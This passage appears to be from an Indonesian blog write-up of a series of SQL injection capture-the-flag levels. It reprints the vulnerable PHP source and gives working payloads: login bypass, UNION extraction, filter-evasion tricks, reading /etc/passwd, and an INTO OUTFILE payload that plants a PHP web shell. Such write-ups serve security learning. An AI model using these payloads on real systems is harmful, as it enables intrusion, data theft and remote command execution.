        <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>


    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

<span class="cp">&lt;?php</span>
<span class="nb">session_destroy</span><span class="p">();</span>
<span class="cp">?&gt;</span>
1
</code></pre></div></div>

<p>Lagi-lagi di level2 ini mereka juga menggunakan prepared statement nya tidak secara keseluruhan, untuk kolom username dia langsung ambil dari user input dengan <code class="highlighter-rouge">$_POST</code> tapi pada kolom password dia mengunakan prepared statement. kita bisa membuat query tersebut selalu mengembalikan true dengan <code class="highlighter-rouge">' OR 1=1#</code></p>

<p><img src="/images/flag-sqli-lv2-1.png" alt="" /></p>

<p>pada soal ini diberitahu bahwa ada 2 flag, berarti kita harus coba dig more ke source code yang diberikan dan ada clue di komentar <code class="highlighter-rouge">// $query = "SELECT flag FROM my_secret_table"; We leave commented code in production because we're cool.</code></p>

<p>dan karena username yang di select dari database di simpan kedalam session dan ditampilkan saat login maka kita bisa menggunakan union untuk mereplace username yang sebenarnya dengan hasil dari query yang kita mau dengan menggunakan union <code class="highlighter-rouge">' union select flag from my_secret_table #</code> sebagai username dan di dapatkan flagnya</p>

<p><img src="/images/flag-sqli-lv2-2.png" alt="" /></p>

<h3 id="level-3">Level 3</h3>

<blockquote>
  <p>Time for bug bounties! This multinational technology company has been hacked so many times, we might be able find a new bug and make some money out of it…</p>
</blockquote>

<p>Diberikan soal seperti search engine <code class="highlighter-rouge">Google</code> tapi ini namanya <code class="highlighter-rouge">Gogol</code></p>

<p><img src="/images/soal-sqli-lv3.png" alt="" /></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'source'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">require</span><span class="p">(</span><span class="s2">"conf/level3.conf.php"</span><span class="p">);</span> 
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>


<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]))</span> <span class="p">{</span>

    <span class="nv">$filter</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'union'</span><span class="p">,</span> <span class="s1">'select'</span><span class="p">);</span>

    <span class="c1">// Remove all banned characters</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filter</span> <span class="k">as</span> <span class="nv">$banned</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$banned</span> <span class="o">.</span> <span class="s1">'/i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]);</span>
    <span class="p">}</span> 
<span class="p">}</span>


<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>Gogol Search<span class="nt">&lt;/title&gt;</span>
 <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"http://www.goglogo.com/include/goglogo.css"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/head&gt;</span>

 <span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"margin:0;padding:0;"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"overlay_bg"</span> <span class="na">style=</span><span class="s">"display:none; background-color:#000000; position:fixed; z-index:1001"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content-area"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"logo"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://funnylogo.info/logo/Google/White/Gogol.aspx"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"searchBox"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;table</span> <span class="na">cellspacing=</span><span class="s">"0"</span> <span class="na">cellpadding=</span><span class="s">"0"</span> <span class="na">border=</span><span class="s">"0"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;tr&gt;</span>
                <span class="nt">&lt;td&gt;</span>
                    <span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"frm"</span> <span class="na">id=</span><span class="s">"frm"</span> <span class="na">method=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">/&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">/&gt;</span>
                    <span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>
                    <span class="nt">&lt;/form&gt;</span>
                <span class="nt">&lt;/td&gt;</span>
            <span class="nt">&lt;/tr&gt;</span>
            <span class="nt">&lt;/table&gt;</span>
            <span class="nt">&lt;br/&gt;</span>
        <span class="nt">&lt;/div&gt;</span>

    <span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]))</span> <span class="p">{</span>

        <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM search_engine WHERE title LIKE '%"</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]</span><span class="o">.</span>  <span class="s2">"%' OR description LIKE '%"</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]</span> <span class="o">.</span>  <span class="s2">"%' OR link LIKE '%"</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"%';"</span><span class="p">;</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>

        <span class="k">echo</span>  <span class="s2">"&lt;h2&gt;Number of results for '"</span><span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"' : "</span> <span class="o">.</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">.</span> <span class="s2">"&lt;/h2&gt;"</span><span class="p">;</span>
    <span class="cp">?&gt;</span>
    <span class="cp">&lt;?php</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;hr/&gt;"</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>

            <span class="c1">// output data of each row</span>
            <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s2">"&lt;div&gt;"</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">"&lt;a href='"</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'link'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"'&gt;&lt;h2&gt;"</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'title'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/h2&gt;&lt;/a&gt;"</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">"&lt;h3&gt;"</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'link'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/h3&gt;"</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">"&lt;p&gt;"</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'description'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="cp">?&gt;</span>

    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
 <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
<span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>
1
</code></pre></div></div>

<p>Oke, kita coba analisa source code yang di dapatkan, disini input kita di treatment secara berbeda dengan level sebelumnya kali ini menggunakan parameter <code class="highlighter-rouge">$_GET</code> kita bisa menggunakan <code class="highlighter-rouge">union</code> lagi untuk me-replace hasil dari query dengan hasil query yang kita inginkan tapi permasalahannya union dan select ada di blacklist.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$filter</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'union'</span><span class="p">,</span> <span class="s1">'select'</span><span class="p">);</span>

<span class="c1">// Remove all banned characters</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$filter</span> <span class="k">as</span> <span class="nv">$banned</span><span class="p">)</span> <span class="p">{</span>
<span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$banned</span> <span class="o">.</span> <span class="s1">'/i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>semua yang match dengan union atau select akan di replace menjadi empty string “” ini sebenernya bad practice karena kita bisa melakukan bypass dengan cara <code class="highlighter-rouge">uniunionon</code> maka union yang di tengah akan di hapus menjadi empty string sehingga terbentuklah union yang tadinya di blacklist, kita sudah berhasil melakukan bypass terhadap filter yang ada.</p>

<p>maka kita bisa menggunakan <code class="highlighter-rouge">' uniunionon selselectect concat(table_name),1,1 from information_schema.tables#</code> untuk mendapatkan semua table yang ada dan kita menemukan table <code class="highlighter-rouge">secret</code></p>

<p><img src="/images/list-table-sqli-lv3.png" alt="" /></p>

<p>kemudian <code class="highlighter-rouge">' uniunionon selselectect concat(column_name),1,1 from information_schema.columns where table_name='secret'#</code> untuk mendapatkan kolom dari table secret</p>

<p><img src="/images/column-sqli-lv3.png" alt="" />ketika kita udah tau nama kolom nya dan tabelnya tinggal dimunculin aja tuh flag gan pake ini <code class="highlighter-rouge">' uniunionon selselectect flag,1,1 from secret#</code></p>

<p><img src="/images/flag-sqli-lv3.png" alt="" /></p>

<h3 id="level-4">Level 4</h3>

<blockquote>
  <p>Seems like our previous bug has been patched now… Let’s double check that they did their job properly.</p>
</blockquote>

<p>Soal yang di berikan sama seperti soal di lvl 3 tapi sekarang blacklist nya diperbaharui</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]))</span> <span class="p">{</span>

    <span class="nv">$filter</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'UNION'</span><span class="p">,</span> <span class="s1">'SELECT'</span><span class="p">);</span>

    <span class="c1">// Remove all banned characters</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filter</span> <span class="k">as</span> <span class="nv">$banned</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">],</span> <span class="nv">$banned</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker detected"</span><span class="p">);</span> 
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">],</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$banned</span><span class="p">))</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker detected"</span><span class="p">);</span> 
    <span class="p">}</span> 
<span class="p">}</span>
</code></pre></div></div>

<p>Singkat cerita jadi itu yang di blacklist adalah “UNION,union,SELECT,SELECT” sehingga kita bisa menggunakan “UNiON,SElECT” dengan cara yang sama dengan level3 kita bisa mendapatkan flagnya</p>

<p><code class="highlighter-rouge">3' UNiON SElECT concat(username,password),1,1 from users#</code></p>

<p><img src="/images/lvl4-sqli-flag.png" alt="" /></p>

<h3 id="level-5">Level 5</h3>

<blockquote>
  <p>These developers are sloppy… They claim that their website is secure now (for the second time), I hope they are right this time…</p>
</blockquote>

<p>Di level5 kali ini di filter kita tidak boleh menggunakan space.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">// Ban space character</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">],</span> <span class="s2">" "</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker detected"</span><span class="p">);</span> 
<span class="p">}</span>
</code></pre></div></div>

<p>ada beberapa trik yang bisa di gunakan untuk menggantikan space di SQL contohya <code class="highlighter-rouge">/**/</code> kita mengunakan komentar untuk mengantikan spasi. dengan menggunakan cara yang sama dengan level sebelumnya kita bisa mendapatkan flagnya</p>

<p><code class="highlighter-rouge">'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secret#</code></p>

<p><img src="/images/sqli-lv5-flag.png" alt="" /></p>

<h3 id="level-6">Level 6</h3>

<blockquote>
  <p>I’m starting to believe that these developers are complete idiots. They just claimed that blacklisting single-quotes and double-quotes solve every SQL injection issue.</p>

  <p>Let’s prove them wrong.</p>
</blockquote>

<p>Kita diberikan soal yang sama lagi dengan level sebelumnya tapi kali ini single quote dan double quote di blacklist jadi kita harus melakukan SQLinjection tanpa single quote dan double quote.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">// Ban space character</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">],</span> <span class="s2">"'"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker detected"</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'q'</span><span class="p">],</span> <span class="s1">'"'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker detected"</span><span class="p">);</span> 
<span class="p">}</span>
</code></pre></div></div>

<h3 id="level-7">Level 7</h3>

<blockquote>
  <p>My teacher has this weird website. I doubt there’s any useful information in the database. Maybe we can leak the /etc/passwd file instead?</p>
</blockquote>

<p>Setelah di enumurasi ternyata beberapa keyword di blacklist, seperti : **Union,Select,Load_File,From. **Dan Spasi juga di blacklist ternyata ketika di coba kita bisa melakukan bypass pada keyword yang di filter dengan cara yang di level sebelumnya yaitu ketika match dengan suatu keyword dia akan mereplace dengan empty string maka kita bisa mengunakan payload <code class="highlighter-rouge">' UNIunionON SELselectECT concat(table_name) frfromom information_schema.tables#</code> namun masih error ternyata karena kita masih mengunakan spasi modifikasi payload tanpa menggunakan spasi <code class="highlighter-rouge">level7.php?id=6565656/**/UNIunionON/**/SELselectECT/**/LOAD_load_fileFILE(%27/etc/passwd%27)#</code></p>

<p><img src="/images/lvl8-sqli.png" alt="" /></p>

<h3 id="level-8">Level 8</h3>

<blockquote>
  <p>I have no idea how I landed here, but this website is making me doubt everything I know.</p>

  <p>Is global warming real???</p>

  <p>Can Trump control the weather???</p>

  <p>Is the Earth flat???</p>

  <p>There’s only one way to find out : let’s pop a shell.</p>
</blockquote>

<p><code class="highlighter-rouge">4444+union+select+null,"&lt;?php%20system($_GET[\"cmd\"]);?&gt;"%20INTO%20OUTFILE%20"/var/www/html/uploads/lala.php"#</code></p>

<p>disini kita bisa menggunakan into outfile untuk menulis file backdoor ke folder uploads</p>

<p><img src="/images/rce-sqli-lv8.png" alt="" />Dan kita menemukan secret folder <strong>secret_level8_folder_you_wont_be_able_to_guess_without_actually_getting_a_shell</strong></p>

<p><img src="/images/secret-folder-sqli-lv8.png" alt="" />kemudian kita mendapatkan flagnya</p>

<p><img src="/images/flag-sqli-lv8.png" alt="" /></p>

</div>
        </article>
        <div class="cf"></div>
        <div class="row text-center">
            <section class="notepad-post-share">
                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;SQLInjection Challenges Writeup: Level 1 - 8&quot;%20http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall%20via%20&#64;abdilahrf"
                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
                    <i class="fa fa-twitter"></i>
                </a>
                <a class="facebook-icon" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall"
                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
                    <i class="fa fa-facebook"></i>
                </a>
                <a class="google-icon" href="https://plus.google.com/share?url=http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall"
                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+">
                    <i class="fa fa-google-plus"></i>
                </a>
            </section>
        </div>
        <div class="cf"></div>
        
            <div class="notepad-author-info">
                <div class="row">
                    <section class="notepad-post-author small-12 columns">
                        
                            <img src="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460" class="notepad-post-author-avatar" alt="Abdillah Muhamad's photo">
                        
                        
                            <span class="author-label">Author</span>
                            <h1>Abdillah Muhamad</h1>
                        
                        
                            <p><a href="mailto:hasny1337@gmail.com" class="author-website">hasny1337@gmail.com</a></p>
                        
                        
                            <p>Coffe make you like a hero</p>
                        
                    </section>
                </div>
            </div>
 
        
        <div class="cf"></div>
        
        <section class="notepad-disqus row">
    <div class="small-12 columns">
        <h1 class="notepad-comments-header">Comments</h1>
        <div id="disqus_thread"></div>
        <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'abdilahrf'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
</section>

        <div class="cf"></div>

    <footer class="notepad-site-footer">
    <div class="copyright">
         <section>All content copyright <a href="http://localhost:4000/about">Abdillah Muhamad</a> &copy; 2018 &bull; All rights reserved.</section>
         <section>Proudly published with <a class="icon-ghost" href="https://jekyllrb.com/">Jekyll</a></section>
    </div>
    <div class="social-icons">
        
        
        <a href="http://twitter.com/abdilahrf">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-twitter fa-stack-1x"></i>
            </span>
        </a>
        
        
        <a href="https://plus.google.com/">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-google-plus fa-stack-1x"></i>
            </span>
        </a>
        
        
        
        <a href="http://github.com/abdilahrf">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-github fa-stack-1x"></i>
            </span>
        </a>
        
        
        <a href="http://facebook.com/abdilah.jk">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-facebook fa-stack-1x"></i>
            </span>
        </a>
        
    </div>
    
    <div class="cf"></div>
</footer> 
</main>    
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="http://localhost:4000/assets/js/vendor/jquery-1.11.1.min.js"><\/script>')</script>
    <script src="http://localhost:4000/assets/js/vendor/modernizr.js"></script>
    <script src="http://localhost:4000/assets/js/foundation.min.js"></script>
    <script src="http://localhost:4000/assets/js/vendor/background-check.js"></script>
    <script src="http://localhost:4000/assets/js/vendor/post-header-animations.js"></script>
    <script src="http://localhost:4000/assets/js/notepad.js"></script>
    <script src="http://localhost:4000/assets/js/scripts.min.js"></script>
    <script src="http://localhost:4000/assets/js/vendor/nprogress.js"></script>

    <script>
      $(document).foundation();
    </script>
    <script type='text/javascript'>console.log("@abdilahrf");</script>
    <script type='text/javascript'>console.log("https://abdilahrf.me");</script>


<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-96190645-1', 'auto');
  ga('require', 'displayfeatures');
  ga('send', 'pageview');

</script>

<script>NProgress.start();var interval=setInterval(function(){NProgress.inc()},1000);jQuery(window).load(function(){clearInterval(interval);NProgress.done()});jQuery(window).unload(function(){NProgress.start()});</script>
 
</body>
</html>